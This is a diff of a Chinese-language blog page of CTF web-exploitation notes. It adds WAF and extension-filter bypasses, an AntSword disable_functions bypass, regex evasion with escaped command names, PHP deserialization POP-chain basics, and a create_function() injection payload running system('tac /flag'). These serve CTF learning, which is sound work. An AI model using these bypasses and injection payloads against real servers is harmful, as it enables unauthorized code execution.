@@ -41,8 +41,9 @@
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241227181622186.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241229164635147.png">
 <meta property="og:image" content="https://kizureina.github.io/images/image-20241229161919687.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20241230204418436.png">
 <meta property="article:published_time" content="2024-12-24T13:01:07.000Z">
-<meta property="article:modified_time" content="2024-12-29T09:50:15.750Z">
+<meta property="article:modified_time" content="2024-12-30T13:20:50.825Z">
 <meta property="article:author" content="Kizurena">
 <meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
 <meta name="twitter:card" content="summary">
@@ -410,7 +411,7 @@
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            7.4k 词 
+            8.2k 词 
           </div>
         </div>
         
@@ -546,6 +547,18 @@
 <li><p>绕过WAF的**<code>Content-Type</code>**检测：HTTP头上方的content-type: multipart&#x2F;form-data 用大小写混淆改为大写M</p>
 </li>
 <li><p>后缀名检测.php，可以用**.php4**</p>
+</li>
+<li><p>当服务器disable_function无法直接访问任意路径时，可以用蚁剑的插件绕过，再访问<code>url/.antproxy.php</code>即可</p>
+</li>
+<li><p>绕过<strong>正则匹配</strong>，若是代码中的关键词检测，可直接加个<strong>转义符分割</strong>即可：</p>
+<ul>
+<li><pre><code class="php">  $Noteasy=new Noteasy(&quot;create_function&quot;,&#39;&#125;system(&quot;l\s /&quot;);/*&#39;);
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">	- `system(&quot;l\s /&quot;);`与`system(&quot;ls /&quot;);`执行时没有区别</span><br><span class="line"></span><br><span class="line">- 查看文件内容的指令：</span><br><span class="line"></span><br><span class="line">	- ```bash</span><br><span class="line">		cat tac highlight_file find echo tail head grep ls </span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+<li><p>tac很常用，将文件内容<strong>反序</strong>输出【实际上影响不大】</p>
+</li>
+</ul>
 </li>
 </ul>
 <h2 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a>哈希碰撞</h2><h4 id="校验代码："><a href="#校验代码：" class="headerlink" title="校验代码："></a>校验代码：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], <span class="string">&#x27;?&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">通过 $_SERVER[&#x27;REQUEST_URI&#x27;] 获取当前请求的 URI（即网页的地址），然后使用 strstr 函数获取 URI 中从 ? 开始的部分。这个部分通常包含 URL 参数。例如，如果 URL 是 example.com/index.php?key=123, strstr 会返回 ?key=123。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">substr($str, 1) 从 $str 的第二个字符开始截取字符串，去掉了前面的问号 ?。在上面的例子中，$str 会变成 key=123。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">实现的关键</span></span><br><span class="line"><span class="comment">parse_str 函数会解析 $str 中的查询字符串并将结果存入变量。假设 $str 为 =123，那么会将 key1 赋值为 123，并且如果存在其他类似的参数，会相应地解析并赋值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -844,6 +857,50 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p><img src="/../images/image-20241229161919687.png" alt="image-20241229161919687"></p>
+<h2 id="PHP反序列化【POP链构造】"><a href="#PHP反序列化【POP链构造】" class="headerlink" title="PHP反序列化【POP链构造】"></a>PHP反序列化【POP链构造】</h2><blockquote>
+<p>关键：构造 pop 链时，从外到内想好每个对象的属性，写代码时，从内到外设置对象的属性。</p>
+<p>另外大多数情况利用的是PHP的动态变量，将<strong>对象</strong>作为变量传入，再调用改对象的方法来执行代码</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set</span>()对不可访问的属性或不存在的属性 进行写入时自动调用</span><br><span class="line"><span class="title function_ invoke__">__get</span>()对不可访问的属性或不存在的属性 进行访问引用时自动调用</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()当类的实例被作为函数的名字执行的时候，就会调用<span class="title function_ invoke__">__invoke</span>()方法</span><br><span class="line"><span class="title function_ invoke__">__call</span>()类对象执行类不存在的方法时候，自动调用<span class="title function_ invoke__">__call</span>()方法</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见函数触发"><a href="#常见函数触发" class="headerlink" title="常见函数触发"></a>常见函数触发</h3><p>注意：一般<code>__destruct()</code>和<code>__wakeup()</code>是一切之始，但有时也需要绕过【例如用属性个数与参数不符绕过wakeup】</p>
+<p>构造POP链子一般都需要有调用魔术方法的对象。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__sleep</span>()       <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="built_in">__wakeip</span>()      <span class="comment">//反序列化时调用</span></span><br><span class="line"><span class="built_in">__destruct</span>()    <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="built_in">__call</span>()        <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="built_in">__callStatic</span>()  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="built_in">__get</span>()         <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="built_in">__set</span>()         <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="built_in">__isset</span>()       <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="built_in">__unset</span>()       <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="built_in">__toString</span>()    <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="built_in">__invoke</span>()      <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：当有私有属性时，在序列化之和还需要<strong>url编码</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Year2</span>));</span><br></pre></td></tr></table></figure>
+
+<p>否则会缺少%00value%00。</p>
+</blockquote>
+<p>主要利用的调用链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>() =&gt; <span class="title function_ invoke__">__sleep</span>() =&gt; <span class="title function_ invoke__">__wakeup</span>() =&gt; <span class="title function_ invoke__">__toString</span>() =&gt; <span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../images/image-20241230204418436.png" alt="image-20241230204418436"></p>
+<p>调用<code>unserialize()</code>时会调用析构函数<code>destruct()</code>。</p>
+<blockquote>
+<p>注意：构造反序列化的输入时，<strong>必须删去没有调用到的函数</strong>，否则会阻止序列化函数执行。</p>
+</blockquote>
+<h3 id="create-function-绕过函数过滤执行代码【相对于eval】"><a href="#create-function-绕过函数过滤执行代码【相对于eval】" class="headerlink" title="create_function()绕过函数过滤执行代码【相对于eval】"></a>create_function()绕过函数过滤执行代码【相对于eval】</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$args</span>: 传入函数的参数，通常是以字符串形式表示的参数列表。</span><br><span class="line"><span class="variable">$code</span>: 函数的主体代码，通常也是字符串</span><br></pre></td></tr></table></figure>
+
+<p><code>create_function</code>函数会创建一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">匿名函数</a>。在此处回创建一个叫 <code>lamvda_1</code>的函数，在第一个 <code>echo</code> 中显示名字，并在第二个 <code>echo</code> 语句中执行该函数。</p>
+<blockquote>
+<p>传入的字符串会直接拼接到 <code>function($args) &#123; $code &#125;</code> 中。</p>
+</blockquote>
+<p><code>create_function</code>函数会在内部执行<code>eval()</code>，在实现过程中会发现是执行了后面的<code>return</code>语句，它属于<code>create_function()</code>中的第二个参数<code>string $code</code>的位置。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b)&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span> \n&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以用于执行命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;&#125;system(&quot;tac /flag&quot;);/*&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>拼接后相对于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;<span class="title function_ invoke__">system</span>(<span class="string">&quot;tac /flag&quot;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
 
         
       </div>
